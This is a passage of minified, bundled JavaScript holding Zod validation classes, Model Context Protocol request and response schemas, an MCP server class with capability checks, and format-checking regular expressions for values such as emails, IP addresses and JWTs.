U=new Set;for(let K of H){if(K.status==="aborted")return a1;if(K.status==="dirty")J.dirty();U.add(K.value)}return{status:J.value,value:U}}let G=[...Q.data.values()].map((H,U)=>W._parse(new v8(Q,H,Q.path,U)));if(Q.common.async)return Promise.all(G).then((H)=>z(H));else return z(G)}min(X,J){return new sX({...this._def,minSize:{value:X,message:h1.toString(J)}})}max(X,J){return new sX({...this._def,maxSize:{value:X,message:h1.toString(J)}})}size(X,J){return this.min(X,J).max(X,J)}nonempty(X){return this.min(1,X)}};sX.create=(X,J)=>{return new sX({valueType:X,minSize:null,maxSize:null,typeName:R1.ZodSet,...z0(J)})};V7=class V7 extends H0{constructor(){super(...arguments);this.validate=this.implement}_parse(X){let{ctx:J}=this._processInputParams(X);if(J.parsedType!==T1.function)return P1(J,{code:F1.invalid_type,expected:T1.function,received:J.parsedType}),a1;function Q(G,H){return Z2({data:G,path:J.path,errorMaps:[J.common.contextualErrorMap,J.schemaErrorMap,q2(),B7].filter((U)=>!!U),issueData:{code:F1.invalid_arguments,argumentsError:H}})}function Y(G,H){return Z2({data:G,path:J.path,errorMaps:[J.common.contextualErrorMap,J.schemaErrorMap,q2(),B7].filter((U)=>!!U),issueData:{code:F1.invalid_return_type,returnTypeError:H}})}let W={errorMap:J.common.contextualErrorMap},z=J.data;if(this._def.returns instanceof oX){let G=this;return $9(async function(...H){let U=new s9([]),K=await G._def.args.parseAsync(H,W).catch((Z)=>{throw U.addIssue(Q(H,Z)),U}),V=await Reflect.apply(z,this,K);return await G._def.returns._def.type.parseAsync(V,W).catch((Z)=>{throw U.addIssue(Y(V,Z)),U})})}else{let G=this;return $9(function(...H){let U=G._def.args.safeParse(H,W);if(!U.success)throw new s9([Q(H,U.error)]);let K=Reflect.apply(z,this,U.data),V=G._def.returns.safeParse(K,W);if(!V.success)throw new s9([Y(K,V.error)]);return V.data})}}parameters(){return this._def.args}returnType(){return this._def.returns}args(...X){return new V7({...this._def,args:Q6.create(X).rest(WX.create())})}returns(X){return new V7({...this._def,returns:X})}implement(X){return this.parse(X)}strictImplement(X){return this.parse(X)}static create(X,J,Q){return new V7({args:X?X:Q6.create([]).rest(WX.create()),returns:J||WX.create(),typeName:R1.ZodFunction,...z0(Q)})}};O7=class O7 extends H0{get schema(){return this._def.getter()}_parse(X){let{ctx:J}=this._processInputParams(X);return this._def.getter()._parse({data:J.data,path:J.path,parent:J})}};O7.create=(X,J)=>{return new O7({getter:X,typeName:R1.ZodLazy,...z0(J)})};R7=class R7 extends H0{_parse(X){if(X.data!==this._def.value){let J=this._getOrReturnCtx(X);return P1(J,{received:J.data,code:F1.invalid_literal,expected:this._def.value}),a1}return{status:"valid",value:X.data}}get value(){return this._def.value}};R7.create=(X,J)=>{return new R7({value:X,typeName:R1.ZodLiteral,...z0(J)})};HX=class HX extends H0{_parse(X){if(typeof X.data!=="string"){let J=this._getOrReturnCtx(X),Q=this._def.values;return P1(J,{expected:N0.joinValues(Q),received:J.parsedType,code:F1.invalid_type}),a1}if(!this._cache)this._cache=new Set(this._def.values);if(!this._cache.has(X.data)){let J=this._getOrReturnCtx(X),Q=this._def.values;return P1(J,{received:J.data,code:F1.invalid_enum_value,options:Q}),a1}return $9(X.data)}get options(){return this._def.values}get enum(){let X={};for(let J of this._def.values)X[J]=J;return X}get Values(){let X={};for(let J of this._def.values)X[J]=J;return X}get Enum(){let X={};for(let J of this._def.values)X[J]=J;return X}extract(X,J=this._def){return HX.create(X,{...this._def,...J})}exclude(X,J=this._def){return HX.create(this.options.filter((Q)=>!X.includes(Q)),{...this._def,...J})}};HX.create=lN;A7=class A7 extends H0{_parse(X){let J=N0.getValidEnumValues(this._def.values),Q=this._getOrReturnCtx(X);if(Q.parsedType!==T1.string&&Q.parsedType!==T1.number){let Y=N0.objectValues(J);return P1(Q,{expected:N0.joinValues(Y),received:Q.parsedType,code:F1.invalid_type}),a1}if(!this._cache)this._cache=new Set(N0.getValidEnumValues(this._def.values));if(!this._cache.has(X.data)){let Y=N0.objectValues(J);return P1(Q,{received:Q.data,code:F1.invalid_enum_value,options:Y}),a1}return $9(X.data)}get enum(){return this._def.values}};A7.create=(X,J)=>{return new A7({values:X,typeName:R1.ZodNativeEnum,...z0(J)})};oX=class oX extends H0{unwrap(){return this._def.type}_parse(X){let{ctx:J}=this._processInputParams(X);if(J.parsedType!==T1.promise&&J.common.async===!1)return P1(J,{code:F1.invalid_type,expected:T1.promise,received:J.parsedType}),a1;let Q=J.parsedType===T1.promise?J.data:Promise.resolve(J.data);return $9(Q.then((Y)=>{return this._def.type.parseAsync(Y,{path:J.path,errorMap:J.common.contextualErrorMap})}))}};oX.create=(X,J)=>{return new oX({type:X,typeName:R1.ZodPromise,...z0(J)})};K8=class K8 extends H0{innerType(){return this._def.schema}sourceType(){return this._def.schema._def.typeName===R1.ZodEffects?this._def.schema.sourceType():this._def.schema}_parse(X){let{status:J,ctx:Q}=this._processInputParams(X),Y=this._def.effect||null,W={addIssue:(z)=>{if(P1(Q,z),z.fatal)J.abort();else J.dirty()},get path(){return Q.path}};if(W.addIssue=W.addIssue.bind(W),Y.type==="preprocess"){let z=Y.transform(Q.data,W);if(Q.common.async)return Promise.resolve(z).then(async(G)=>{if(J.value==="aborted")return a1;let H=await this._def.schema._parseAsync({data:G,path:Q.path,parent:Q});if(H.status==="aborted")return a1;if(H.status==="dirty")return K7(H.value);if(J.value==="dirty")return K7(H.value);return H});else{if(J.value==="aborted")return a1;let G=this._def.schema._parseSync({data:z,path:Q.path,parent:Q});if(G.status==="aborted")return a1;if(G.status==="dirty")return K7(G.value);if(J.value==="dirty")return K7(G.value);return G}}if(Y.type==="refinement"){let z=(G)=>{let H=Y.refinement(G,W);if(Q.common.async)return Promise.resolve(H);if(H instanceof Promise)throw new Error("Async refinement encountered during synchronous parse operation. Use .parseAsync instead.");return G};if(Q.common.async===!1){let G=this._def.schema._parseSync({data:Q.data,path:Q.path,parent:Q});if(G.status==="aborted")return a1;if(G.status==="dirty")J.dirty();return z(G.value),{status:J.value,value:G.value}}else return this._def.schema._parseAsync({data:Q.data,path:Q.path,parent:Q}).then((G)=>{if(G.status==="aborted")return a1;if(G.status==="dirty")J.dirty();return z(G.value).then(()=>{return{status:J.value,value:G.value}})})}if(Y.type==="transform")if(Q.common.async===!1){let z=this._def.schema._parseSync({data:Q.data,path:Q.path,parent:Q});if(!rX(z))return a1;let G=Y.transform(z.value,W);if(G instanceof Promise)throw new Error("Asynchronous transform encountered during synchronous parse operation. Use .parseAsync instead.");return{status:J.value,value:G}}else return this._def.schema._parseAsync({data:Q.data,path:Q.path,parent:Q}).then((z)=>{if(!rX(z))return a1;return Promise.resolve(Y.transform(z.value,W)).then((G)=>({status:J.value,value:G}))});N0.assertNever(Y)}};K8.create=(X,J,Q)=>{return new K8({schema:X,typeName:R1.ZodEffects,effect:J,...z0(Q)})};K8.createWithPreprocess=(X,J,Q)=>{return new K8({schema:J,effect:{type:"preprocess",transform:X},typeName:R1.ZodEffects,...z0(Q)})};U8=class U8 extends H0{_parse(X){if(this._getType(X)===T1.undefined)return $9(void 0);return this._def.innerType._parse(X)}unwrap(){return this._def.innerType}};U8.create=(X,J)=>{return new U8({innerType:X,typeName:R1.ZodOptional,...z0(J)})};_6=class _6 extends H0{_parse(X){if(this._getType(X)===T1.null)return $9(null);return this._def.innerType._parse(X)}unwrap(){return this._def.innerType}};_6.create=(X,J)=>{return new _6({innerType:X,typeName:R1.ZodNullable,...z0(J)})};N7=class N7 extends H0{_parse(X){let{ctx:J}=this._processInputParams(X),Q=J.data;if(J.parsedType===T1.undefined)Q=this._def.defaultValue();return this._def.innerType._parse({data:Q,path:J.path,parent:J})}removeDefault(){return this._def.innerType}};N7.create=(X,J)=>{return new N7({innerType:X,typeName:R1.ZodDefault,defaultValue:typeof J.default==="function"?J.default:()=>J.default,...z0(J)})};L7=class L7 extends H0{_parse(X){let{ctx:J}=this._processInputParams(X),Q={...J,common:{...J.common,issues:[]}},Y=this._def.innerType._parse({data:Q.data,path:Q.path,parent:{...Q}});if(YQ(Y))return Y.then((W)=>{return{status:"valid",value:W.status==="valid"?W.value:this._def.catchValue({get error(){return new s9(Q.common.issues)},input:Q.data})}});else return{status:"valid",value:Y.status==="valid"?Y.value:this._def.catchValue({get error(){return new s9(Q.common.issues)},input:Q.data})}}removeCatch(){return this._def.innerType}};L7.create=(X,J)=>{return new L7({innerType:X,typeName:R1.ZodCatch,catchValue:typeof J.catch==="function"?J.catch:()=>J.catch,...z0(J)})};UQ=class UQ extends H0{_parse(X){if(this._getType(X)!==T1.nan){let Q=this._getOrReturnCtx(X);return P1(Q,{code:F1.invalid_type,expected:T1.nan,received:Q.parsedType}),a1}return{status:"valid",value:X.data}}};UQ.create=(X)=>{return new UQ({typeName:R1.ZodNaN,...z0(X)})};Gg1=Symbol("zod_brand");O2=class O2 extends H0{_parse(X){let{ctx:J}=this._processInputParams(X),Q=J.data;return this._def.type._parse({data:Q,path:J.path,parent:J})}unwrap(){return this._def.type}};KQ=class KQ extends H0{_parse(X){let{status:J,ctx:Q}=this._processInputParams(X);if(Q.common.async)return(async()=>{let W=await this._def.in._parseAsync({data:Q.data,path:Q.path,parent:Q});if(W.status==="aborted")return a1;if(W.status==="dirty")return J.dirty(),K7(W.value);else return this._def.out._parseAsync({data:W.value,path:Q.path,parent:Q})})();else{let Y=this._def.in._parseSync({data:Q.data,path:Q.path,parent:Q});if(Y.status==="aborted")return a1;if(Y.status==="dirty")return J.dirty(),{status:"dirty",value:Y.value};else return this._def.out._parseSync({data:Y.value,path:Q.path,parent:Q})}}static create(X,J){return new KQ({in:X,out:J,typeName:R1.ZodPipeline})}};D7=class D7 extends H0{_parse(X){let J=this._def.innerType._parse(X),Q=(Y)=>{if(rX(Y))Y.value=Object.freeze(Y.value);return Y};return YQ(J)?J.then((Y)=>Q(Y)):Q(J)}unwrap(){return this._def.innerType}};D7.create=(X,J)=>{return new D7({innerType:X,typeName:R1.ZodReadonly,...z0(J)})};zg1={object:p0.lazycreate};(function(X){X.ZodString="ZodString",X.ZodNumber="ZodNumber",X.ZodNaN="ZodNaN",X.ZodBigInt="ZodBigInt",X.ZodBoolean="ZodBoolean",X.ZodDate="ZodDate",X.ZodSymbol="ZodSymbol",X.ZodUndefined="ZodUndefined",X.ZodNull="ZodNull",X.ZodAny="ZodAny",X.ZodUnknown="ZodUnknown",X.ZodNever="ZodNever",X.ZodVoid="ZodVoid",X.ZodArray="ZodArray",X.ZodObject="ZodObject",X.ZodUnion="ZodUnion",X.ZodDiscriminatedUnion="ZodDiscriminatedUnion",X.ZodIntersection="ZodIntersection",X.ZodTuple="ZodTuple",X.ZodRecord="ZodRecord",X.ZodMap="ZodMap",X.ZodSet="ZodSet",X.ZodFunction="ZodFunction",X.ZodLazy="ZodLazy",X.ZodLiteral="ZodLiteral",X.ZodEnum="ZodEnum",X.ZodEffects="ZodEffects",X.ZodNativeEnum="ZodNativeEnum",X.ZodOptional="ZodOptional",X.ZodNullable="ZodNullable",X.ZodDefault="ZodDefault",X.ZodCatch="ZodCatch",X.ZodPromise="ZodPromise",X.ZodBranded="ZodBranded",X.ZodPipeline="ZodPipeline",X.ZodReadonly="ZodReadonly"})(R1||(R1={}));dN=k8.create,iN=GX.create,Ug1=UQ.create,Kg1=zX.create,rN=q7.create,Vg1=nX.create,Bg1=WQ.create,qg1=Z7.create,Zg1=M7.create,Mg1=aX.create,Fg1=WX.create,jg1=J6.create,Og1=GQ.create,Rg1=b8.create,Ag1=p0.create,Ng1=p0.strictCreate,Lg1=F7.create,Dg1=j2.create,wg1=j7.create,Ig1=Q6.create,Cg1=zQ.create,Pg1=HQ.create,Sg1=sX.create,Tg1=V7.create,_g1=O7.create,Eg1=R7.create,$g1=HX.create,kg1=A7.create,bg1=oX.create,LN=K8.create,vg1=U8.create,xg1=_6.create,fg1=K8.createWithPreprocess,gg1=KQ.create,ug1={string:(X)=>k8.create({...X,coerce:!0}),number:(X)=>GX.create({...X,coerce:!0}),boolean:(X)=>q7.create({...X,coerce:!0}),bigint:(X)=>zX.create({...X,coerce:!0}),date:(X)=>nX.create({...X,coerce:!0})},cg1=a1,lg1=[nN,"2025-03-26","2024-11-05","2024-10-07"],aN=L.union([L.string(),L.number().int()]),sN=L.string(),pg1=L.object({progressToken:L.optional(aN)}).passthrough(),V8=L.object({_meta:L.optional(pg1)}).passthrough(),p9=L.object({method:L.string(),params:L.optional(V8)}),VQ=L.object({_meta:L.optional(L.object({}).passthrough())}).passthrough(),Y6=L.object({method:L.string(),params:L.optional(VQ)}),B8=L.object({_meta:L.optional(L.object({}).passthrough())}).passthrough(),A2=L.union([L.string(),L.number().int()]),oN=L.object({jsonrpc:L.literal(R2),id:A2}).merge(p9).strict(),tN=L.object({jsonrpc:L.literal(R2)}).merge(Y6).strict(),eN=L.object({jsonrpc:L.literal(R2),id:A2,result:B8}).strict();(function(X){X[X.ConnectionClosed=-32000]="ConnectionClosed",X[X.RequestTimeout=-32001]="RequestTimeout",X[X.ParseError=-32700]="ParseError",X[X.InvalidRequest=-32600]="InvalidRequest",X[X.MethodNotFound=-32601]="MethodNotFound",X[X.InvalidParams=-32602]="InvalidParams",X[X.InternalError=-32603]="InternalError"})(l0||(l0={}));XL=L.object({jsonrpc:L.literal(R2),id:A2,error:L.object({code:L.number().int(),message:L.string(),data:L.optional(L.unknown())})}).strict(),r80=L.union([oN,tN,eN,XL]),MH=B8.strict(),FH=Y6.extend({method:L.literal("notifications/cancelled"),params:VQ.extend({requestId:A2,reason:L.string().optional()})}),BQ=L.object({name:L.string(),title:L.optional(L.string())}).passthrough(),JL=BQ.extend({version:L.string()}),ng1=L.object({experimental:L.optional(L.object({}).passthrough()),sampling:L.optional(L.object({}).passthrough()),elicitation:L.optional(L.object({}).passthrough()),roots:L.optional(L.object({listChanged:L.optional(L.boolean())}).passthrough())}).passthrough(),QL=p9.extend({method:L.literal("initialize"),params:V8.extend({protocolVersion:L.string(),capabilities:ng1,clientInfo:JL})}),ag1=L.object({experimental:L.optional(L.object({}).passthrough()),logging:L.optional(L.object({}).passthrough()),completions:L.optional(L.object({}).passthrough()),prompts:L.optional(L.object({listChanged:L.optional(L.boolean())}).passthrough()),resources:L.optional(L.object({subscribe:L.optional(L.boolean()),listChanged:L.optional(L.boolean())}).passthrough()),tools:L.optional(L.object({listChanged:L.optional(L.boolean())}).passthrough())}).passthrough(),sg1=B8.extend({protocolVersion:L.string(),capabilities:ag1,serverInfo:JL,instructions:L.optional(L.string())}),YL=Y6.extend({method:L.literal("notifications/initialized")}),jH=p9.extend({method:L.literal("ping")}),og1=L.object({progress:L.number(),total:L.optional(L.number()),message:L.optional(L.string())}).passthrough(),OH=Y6.extend({method:L.literal("notifications/progress"),params:VQ.merge(og1).extend({progressToken:aN})}),N2=p9.extend({params:V8.extend({cursor:L.optional(sN)}).optional()}),L2=B8.extend({nextCursor:L.optional(sN)}),WL=L.object({uri:L.string(),mimeType:L.optional(L.string()),_meta:L.optional(L.object({}).passthrough())}).passthrough(),GL=WL.extend({text:L.string()}),RH=L.string().refine((X)=>{try{return atob(X),!0}catch(J){return!1}},{message:"Invalid Base64 string"}),zL=WL.extend({blob:RH}),HL=BQ.extend({uri:L.string(),description:L.optional(L.string()),mimeType:L.optional(L.string()),_meta:L.optional(L.object({}).passthrough())}),tg1=BQ.extend({uriTemplate:L.string(),description:L.optional(L.string()),mimeType:L.optional(L.string()),_meta:L.optional(L.object({}).passthrough())}),QH=N2.extend({method:L.literal("resources/list")}),eg1=L2.extend({resources:L.array(HL)}),YH=N2.extend({method:L.literal("resources/templates/list")}),Xh1=L2.extend({resourceTemplates:L.array(tg1)}),WH=p9.extend({method:L.literal("resources/read"),params:V8.extend({uri:L.string()})}),Jh1=B8.extend({contents:L.array(L.union([GL,zL]))}),Qh1=Y6.extend({method:L.literal("notifications/resources/list_changed")}),Yh1=p9.extend({method:L.literal("resources/subscribe"),params:V8.extend({uri:L.string()})}),Wh1=p9.extend({method:L.literal("resources/unsubscribe"),params:V8.extend({uri:L.string()})}),Gh1=Y6.extend({method:L.literal("notifications/resources/updated"),params:VQ.extend({uri:L.string()})}),zh1=L.object({name:L.string(),description:L.optional(L.string()),required:L.optional(L.boolean())}).passthrough(),Hh1=BQ.extend({description:L.optional(L.string()),arguments:L.optional(L.array(zh1)),_meta:L.optional(L.object({}).passthrough())}),GH=N2.extend({method:L.literal("prompts/list")}),Uh1=L2.extend({prompts:L.array(Hh1)}),zH=p9.extend({method:L.literal("prompts/get"),params:V8.extend({name:L.string(),arguments:L.optional(L.record(L.string()))})}),AH=L.object({type:L.literal("text"),text:L.string(),_meta:L.optional(L.object({}).passthrough())}).passthrough(),NH=L.object({type:L.literal("image"),data:RH,mimeType:L.string(),_meta:L.optional(L.object({}).passthrough())}).passthrough(),LH=L.object({type:L.literal("audio"),data:RH,mimeType:L.string(),_meta:L.optional(L.object({}).passthrough())}).passthrough(),Kh1=L.object({type:L.literal("resource"),resource:L.union([GL,zL]),_meta:L.optional(L.object({}).passthrough())}).passthrough(),Vh1=HL.extend({type:L.literal("resource_link")}),UL=L.union([AH,NH,LH,Vh1,Kh1]),Bh1=L.object({role:L.enum(["user","assistant"]),content:UL}).passthrough(),qh1=B8.extend({description:L.optional(L.string()),messages:L.array(Bh1)}),Zh1=Y6.extend({method:L.literal("notifications/prompts/list_changed")}),Mh1=L.object({title:L.optional(L.string()),readOnlyHint:L.optional(L.boolean()),destructiveHint:L.optional(L.boolean()),idempotentHint:L.optional(L.boolean()),openWorldHint:L.optional(L.boolean())}).passthrough(),Fh1=BQ.extend({description:L.optional(L.string()),inputSchema:L.object({type:L.literal("object"),properties:L.optional(L.object({}).passthrough()),required:L.optional(L.array(L.string()))}).passthrough(),outputSchema:L.optional(L.object({type:L.literal("object"),properties:L.optional(L.object({}).passthrough()),required:L.optional(L.array(L.string()))}).passthrough()),annotations:L.optional(Mh1),_meta:L.optional(L.object({}).passthrough())}),HH=N2.extend({method:L.literal("tools/list")}),jh1=L2.extend({tools:L.array(Fh1)}),KL=B8.extend({content:L.array(UL).default([]),structuredContent:L.object({}).passthrough().optional(),isError:L.optional(L.boolean())}),n80=KL.or(B8.extend({toolResult:L.unknown()})),UH=p9.extend({method:L.literal("tools/call"),params:V8.extend({name:L.string(),arguments:L.optional(L.record(L.unknown()))})}),Oh1=Y6.extend({method:L.literal("notifications/tools/list_changed")}),VL=L.enum(["debug","info","notice","warning","error","critical","alert","emergency"]),Rh1=p9.extend({method:L.literal("logging/setLevel"),params:V8.extend({level:VL})}),Ah1=Y6.extend({method:L.literal("notifications/message"),params:VQ.extend({level:VL,logger:L.optional(L.string()),data:L.unknown()})}),Nh1=L.object({name:L.string().optional()}).passthrough(),Lh1=L.object({hints:L.optional(L.array(Nh1)),costPriority:L.optional(L.number().min(0).max(1)),speedPriority:L.optional(L.number().min(0).max(1)),intelligencePriority:L.optional(L.number().min(0).max(1))}).passthrough(),Dh1=L.object({role:L.enum(["user","assistant"]),content:L.union([AH,NH,LH])}).passthrough(),wh1=p9.extend({method:L.literal("sampling/createMessage"),params:V8.extend({messages:L.array(Dh1),systemPrompt:L.optional(L.string()),includeContext:L.optional(L.enum(["none","thisServer","allServers"])),temperature:L.optional(L.number()),maxTokens:L.number().int(),stopSequences:L.optional(L.array(L.string())),metadata:L.optional(L.object({}).passthrough()),modelPreferences:L.optional(Lh1)})}),BL=B8.extend({model:L.string(),stopReason:L.optional(L.enum(["endTurn","stopSequence","maxTokens"]).or(L.string())),role:L.enum(["user","assistant"]),content:L.discriminatedUnion("type",[AH,NH,LH])}),Ih1=L.object({type:L.literal("boolean"),title:L.optional(L.string()),description:L.optional(L.string()),default:L.optional(L.boolean())}).passthrough(),Ch1=L.object({type:L.literal("string"),title:L.optional(L.string()),description:L.optional(L.string()),minLength:L.optional(L.number()),maxLength:L.optional(L.number()),format:L.optional(L.enum(["email","uri","date","date-time"]))}).passthrough(),Ph1=L.object({type:L.enum(["number","integer"]),title:L.optional(L.string()),description:L.optional(L.string()),minimum:L.optional(L.number()),maximum:L.optional(L.number())}).passthrough(),Sh1=L.object({type:L.literal("string"),title:L.optional(L.string()),description:L.optional(L.string()),enum:L.array(L.string()),enumNames:L.optional(L.array(L.string()))}).passthrough(),Th1=L.union([Ih1,Ch1,Ph1,Sh1]),_h1=p9.extend({method:L.literal("elicitation/create"),params:V8.extend({message:L.string(),requestedSchema:L.object({type:L.literal("object"),properties:L.record(L.string(),Th1),required:L.optional(L.array(L.string()))}).passthrough()})}),qL=B8.extend({action:L.enum(["accept","decline","cancel"]),content:L.optional(L.record(L.string(),L.unknown()))}),Eh1=L.object({type:L.literal("ref/resource"),uri:L.string()}).passthrough(),$h1=L.object({type:L.literal("ref/prompt"),name:L.string()}).passthrough(),KH=p9.extend({method:L.literal("completion/complete"),params:V8.extend({ref:L.union([$h1,Eh1]),argument:L.object({name:L.string(),value:L.string()}).passthrough(),context:L.optional(L.object({arguments:L.optional(L.record(L.string(),L.string()))}))})}),kh1=B8.extend({completion:L.object({values:L.array(L.string()).max(100),total:L.optional(L.number().int()),hasMore:L.optional(L.boolean())}).passthrough()}),bh1=L.object({uri:L.string().startsWith("file://"),name:L.optional(L.string()),_meta:L.optional(L.object({}).passthrough())}).passthrough(),vh1=p9.extend({method:L.literal("roots/list")}),ZL=B8.extend({roots:L.array(bh1)}),xh1=Y6.extend({method:L.literal("notifications/roots/list_changed")}),a80=L.union([jH,QL,KH,Rh1,zH,GH,QH,YH,WH,Yh1,Wh1,UH,HH]),s80=L.union([FH,OH,YL,xh1]),o80=L.union([MH,BL,qL,ZL]),t80=L.union([jH,wh1,_h1,vh1]),e80=L.union([FH,OH,Ah1,Gh1,Qh1,Oh1,Zh1]),X60=L.union([MH,sg1,kh1,qh1,Uh1,eg1,Xh1,Jh1,KL,jh1]);n0=class n0 extends Error{constructor(X,J,Q){super(`MCP error ${X}: ${J}`);this.code=X,this.data=Q,this.name="McpError"}};hh1=lx1(If1(),1);FL=class FL extends ML{constructor(X,J){var Q;super(J);this._serverInfo=X,this._capabilities=(Q=J===null||J===void 0?void 0:J.capabilities)!==null&&Q!==void 0?Q:{},this._instructions=J===null||J===void 0?void 0:J.instructions,this.setRequestHandler(QL,(Y)=>this._oninitialize(Y)),this.setNotificationHandler(YL,()=>{var Y;return(Y=this.oninitialized)===null||Y===void 0?void 0:Y.call(this)})}registerCapabilities(X){if(this.transport)throw new Error("Cannot register capabilities after connecting to transport");this._capabilities=gh1(this._capabilities,X)}assertCapabilityForMethod(X){var J,Q,Y;switch(X){case"sampling/createMessage":if(!((J=this._clientCapabilities)===null||J===void 0?void 0:J.sampling))throw new Error(`Client does not support sampling (required for ${X})`);break;case"elicitation/create":if(!((Q=this._clientCapabilities)===null||Q===void 0?void 0:Q.elicitation))throw new Error(`Client does not support elicitation (required for ${X})`);break;case"roots/list":if(!((Y=this._clientCapabilities)===null||Y===void 0?void 0:Y.roots))throw new Error(`Client does not support listing roots (required for ${X})`);break;case"ping":break}}assertNotificationCapability(X){switch(X){case"notifications/message":if(!this._capabilities.logging)throw new Error(`Server does not support logging (required for ${X})`);break;case"notifications/resources/updated":case"notifications/resources/list_changed":if(!this._capabilities.resources)throw new Error(`Server does not support notifying about resources (required for ${X})`);break;case"notifications/tools/list_changed":if(!this._capabilities.tools)throw new Error(`Server does not support notifying of tool list changes (required for ${X})`);break;case"notifications/prompts/list_changed":if(!this._capabilities.prompts)throw new Error(`Server does not support notifying of prompt list changes (required for ${X})`);break;case"notifications/cancelled":break;case"notifications/progress":break}}assertRequestHandlerCapability(X){switch(X){case"sampling/createMessage":if(!this._capabilities.sampling)throw new Error(`Server does not support sampling (required for ${X})`);break;case"logging/setLevel":if(!this._capabilities.logging)throw new Error(`Server does not support logging (required for ${X})`);break;case"prompts/get":case"prompts/list":if(!this._capabilities.prompts)throw new Error(`Server does not support prompts (required for ${X})`);break;case"resources/list":case"resources/templates/list":case"resources/read":if(!this._capabilities.resources)throw new Error(`Server does not support resources (required for ${X})`);break;case"tools/call":case"tools/list":if(!this._capabilities.tools)throw new Error(`Server does not support tools (required for ${X})`);break;case"ping":case"initialize":break}}async _oninitialize(X){let J=X.params.protocolVersion;return this._clientCapabilities=X.params.capabilities,this._clientVersion=X.params.clientInfo,{protocolVersion:lg1.includes(J)?J:nN,capabilities:this.getCapabilities(),serverInfo:this._serverInfo,...this._instructions&&{instructions:this._instructions}}}getClientCapabilities(){return this._clientCapabilities}getClientVersion(){return this._clientVersion}getCapabilities(){return this._capabilities}async ping(){return this.request({method:"ping"},MH)}async createMessage(X,J){return this.request({method:"sampling/createMessage",params:X},BL,J)}async elicitInput(X,J){let Q=await this.request({method:"elicitation/create",params:X},qL,J);if(Q.action==="accept"&&Q.content)try{let Y=new hh1.default,W=Y.compile(X.requestedSchema);if(!W(Q.content))throw new n0(l0.InvalidParams,`Elicitation response content does not match requested schema: ${Y.errorsText(W.errors)}`)}catch(Y){if(Y instanceof n0)throw Y;throw new n0(l0.InternalError,`Error validating elicitation response: ${Y}`)}return Q}async listRoots(X,J){return this.request({method:"roots/list",params:X},ZL,J)}async sendLoggingMessage(X){return this.notification({method:"notifications/message",params:X})}async sendResourceUpdated(X){return this.notification({method:"notifications/resources/updated",params:X})}async sendResourceListChanged(){return this.notification({method:"notifications/resources/list_changed"})}async sendToolListChanged(){return this.notification({method:"notifications/tools/list_changed"})}async sendPromptListChanged(){return this.notification({method:"notifications/prompts/list_changed"})}};yh1=Symbol("Let zodToJsonSchema decide on which parser to use"),wN={name:void 0,$refStrategy:"root",basePath:["#"],effectStrategy:"input",pipeStrategy:"all",dateStrategy:"format:date-time",mapStrategy:"entries",removeAdditionalStrategy:"passthrough",allowedAdditionalProperties:!0,rejectedAdditionalProperties:!1,definitionPath:"definitions",target:"jsonSchema7",strictUnions:!1,definitions:{},errorMessages:!1,markdownDescription:!1,patternStrategy:"escape",applyRegexFlags:!1,emailStrategy:"format:email",base64Strategy:"contentEncoding:base64",nameStrategy:"ref"};E8={cuid:/^[cC][^\s-]{8,}$/,cuid2:/^[0-9a-z]+$/,ulid:/^[0-9A-HJKMNP-TV-Z]{26}$/,email:/^(?!\.)(?!.*\.\.)([a-zA-Z0-9_'+\-\.]*)[a-zA-Z0-9_+-]@([a-zA-Z0-9][a-zA-Z0-9\-]*\.)+[a-zA-Z]{2,}$/,emoji:()=>{if(az===void 0)az=RegExp("^(\\p{Extended_Pictographic}|\\p{Emoji_Component})+$","u");return az},uuid:/^[0-9a-fA-F]{8}\b-[0-9a-fA-F]{4}\b-[0-9a-fA-F]{4}\b-[0-9a-fA-F]{4}\b-[0-9a-fA-F]{12}$/,ipv4:/^(?:(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])\.){3}(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])$/,ipv4Cidr:/^(?:(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])\.){3}(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])\/(3[0-2]|[12]?[0-9])$/,ipv6:/^(([a-f0-9]{1,4}:){7}|::([a-f0-9]{1,4}:){0,6}|([a-f0-9]{1,4}:){1}:([a-f0-9]{1,4}:){0,5}|([a-f0-9]{1,4}:){2}:([a-f0-9]{1,4}:){0,4}|([a-f0-9]{1,4}:){3}:([a-f0-9]{1,4}:){0,3}|([a-f0-9]{1,4}:){4}:([a-f0-9]{1,4}:){0,2}|([a-f0-9]{1,4}:){5}:([a-f0-9]{1,4}:){0,1})([a-f0-9]{1,4}|(((25[0-5])|(2[0-4][0-9])|(1[0-9]{2})|([0-9]{1,2}))\.){3}((25[0-5])|(2[0-4][0-9])|(1[0-9]{2})|([0-9]{1,2})))$/,ipv6Cidr:/^(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))\/(12[0-8]|1[01][0-9]|[1-9]?[0-9])$/,base64:/^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/,base64url:/^([0-9a-zA-Z-_]{4})*(([0-9a-zA-Z-_]{2}(==)?)|([0-9a-zA-Z-_]{3}(=)?))?$/,nanoid:/^[a-zA-Z0-9_-]{21}$/,jwt:/^[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]*$/};Xy1=new 